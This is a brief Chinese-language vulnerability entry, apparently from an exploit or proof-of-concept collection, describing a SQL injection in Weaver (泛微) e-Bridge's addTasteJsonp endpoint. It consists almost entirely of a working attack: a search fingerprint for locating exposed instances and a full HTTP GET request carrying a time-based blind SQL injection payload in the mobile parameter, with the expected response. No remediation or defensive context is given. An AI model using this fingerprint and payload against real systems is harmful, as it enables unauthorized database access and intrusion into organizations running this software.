# 泛微-云桥e-BridgeaddTasteJsonpSQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微云桥e-Bridge"`
- **请求**：`GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1'+AND+(SELECT+6488+FROM+(SELECT(SLEEP(5)))CvMg)+OR+'JmLq'='IpuI HTTP/1.1`
- **响应特征**：200